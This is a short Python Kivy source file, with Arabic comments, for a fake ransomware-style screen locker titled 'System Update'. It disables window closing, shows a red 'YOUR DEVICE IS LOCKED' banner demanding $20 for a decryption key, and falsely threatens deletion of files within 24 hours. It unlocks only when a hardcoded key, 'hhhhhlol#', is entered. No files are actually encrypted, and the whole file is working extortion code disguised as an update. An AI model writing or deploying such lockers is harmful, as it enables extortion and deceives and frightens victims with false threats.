import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window

# الـ Key اللي اتفقنا عليه
THE_KEY = "hhhhhlol#"

class D3f4ultApp(App):
    def build(self):
        self.title = "System Update"
        # منع المستخدم من إغلاق التطبيق (قفل مبدئي)
        Window.bind(on_request_close=self.prevent_close)
        
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        # رسالة التهديد الأساسية
        layout.add_widget(Label(
            text="[color=ff0000][b]YOUR DEVICE IS LOCKED[/b][/color]\n\n"
                 "Pay 20$ to get the decryption key.\n"
                 "Files will be deleted in 24 hours.",
            markup=True, font_size='20sp', halign='center'))

        self.input_key = TextInput(hint_text="Enter Key...", multiline=False, size_hint_y=None, height=120)
        btn = Button(text="UNLOCK", background_color=(1, 0, 0, 1), size_hint_y=None, height=100)
        btn.bind(on_press=self.verify_key)

        layout.add_widget(self.input_key)
        layout.add_widget(btn)
        
        return layout

    def prevent_close(self, *args):
        return True # دي بتخلي زرار الرجوع والخروج ميعملوش حاجة

    def verify_key(self, instance):
        if self.input_key.text == THE_KEY:
            os._exit(0) # لو الكود صح التطبيق يقفل ويرجع الجهاز طبيعي

if __name__ == '__main__':
    D3f4ultApp().run()
